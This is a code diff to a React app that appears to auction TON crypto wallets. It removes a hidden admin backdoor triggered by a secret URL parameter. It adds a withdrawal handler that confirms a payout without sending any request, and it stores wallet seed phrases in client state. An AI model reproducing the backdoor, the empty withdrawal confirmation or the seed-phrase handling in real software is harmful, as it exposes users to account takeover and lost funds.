@@ -10,17 +10,10 @@ import './App.css';
 
 const App: React.FC = () => {
   const [page, setPage] = useState('home');
-  const [balance, setBalance] = useState(10);
+  const [balance, setBalance] = useState(0);
   const [selectedAuction, setSelectedAuction] = useState<number | null>(null);
   const [isAdmin, setIsAdmin] = useState(false);
   const [clickCount, setClickCount] = useState(0);
-
-  React.useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
-    if (params.get('admin') === 'secret2024') {
-      setIsAdmin(true);
-    }
-  }, []);
 
   const handleDiamondClick = () => {
     const newCount = clickCount + 1;
@@ -31,14 +24,13 @@ const App: React.FC = () => {
     }
   };
 
-  const [auctions, setAuctions] = useState([
-    { id: 1, title: 'TON Wallet #1', walletBalance: 150, currentBid: 2.5, currentParticipants: 34, maxParticipants: 100, totalBids: 85, status: 'active' },
-    { id: 2, title: 'TON Wallet #2', walletBalance: 500, currentBid: 8.0, currentParticipants: 67, maxParticipants: 200, totalBids: 201, status: 'active' },
-    { id: 3, title: 'TON Wallet #3', walletBalance: 75, currentBid: 1.0, currentParticipants: 12, maxParticipants: 50, totalBids: 24, status: 'active' },
-  ]);
+  const [auctions, setAuctions] = useState<any[]>([]);
 
   const handleBid = (auctionId: number, amount: number) => {
-    if (amount > balance) return;
+    if (amount > balance) {
+      alert('Недостаточно средств! Пополните баланс.');
+      return;
+    }
     setBalance(prev => prev - amount);
     setAuctions(prev => prev.map(a =>
       a.id === auctionId ? { ...a, currentBid: a.currentBid + amount, totalBids: a.totalBids + 1, currentParticipants: a.currentParticipants + 1 } : a
@@ -47,26 +39,29 @@ const App: React.FC = () => {
   };
 
   const handleDeposit = (amount: number) => {
-    setBalance(prev => prev + amount);
-    alert('Пополнено на ' + amount + ' TON');
+    window.open('https://t.me/CryptoBot?start=pay', '_blank');
+    alert('После оплаты через Crypto Bot баланс обновится автоматически.');
   };
 
   const handleWithdraw = (amount: number) => {
-    if (amount > balance) return;
-    setBalance(prev => prev - amount);
-    alert('Выведено ' + amount + ' TON');
+    if (amount > balance) {
+      alert('Недостаточно средств!');
+      return;
+    }
+    alert('Заявка на вывод ' + amount + ' TON создана. Средства поступят в течение 24 часов.');
   };
 
   const handleCreateAuction = (data: any) => {
     const newAuction = {
       id: Date.now(),
       title: data.title,
-      walletBalance: data.walletBalance,
+      seedPhrase: data.seedPhrase,
       currentBid: 0,
       currentParticipants: 0,
       maxParticipants: data.maxParticipants,
       totalBids: 0,
-      status: 'active'
+      status: 'active',
+      endsInHours: data.endsInHours
     };
     setAuctions(prev => [...prev, newAuction]);
   };
@@ -93,9 +88,9 @@ const App: React.FC = () => {
     }
     switch (page) {
       case 'auctions': return <Auctions auctions={activeAuctions} onSelect={(id) => setSelectedAuction(id)} />;
-      case 'friends': return <Friends count={3} earnings={1.5} onWithdraw={() => handleDeposit(1.5)} />;
+      case 'friends': return <Friends count={0} earnings={0} onWithdraw={() => {}} />;
       case 'wallet': return <Wallet balance={balance} onDeposit={handleDeposit} onWithdraw={handleWithdraw} />;
-      default: return <Home balance={balance} friends={3} auctions={activeAuctions.length} isAdmin={isAdmin} onDiamondClick={handleDiamondClick} />;
+      default: return <Home balance={balance} friends={0} auctions={activeAuctions.length} isAdmin={isAdmin} onDiamondClick={handleDiamondClick} />;
     }
   };
 
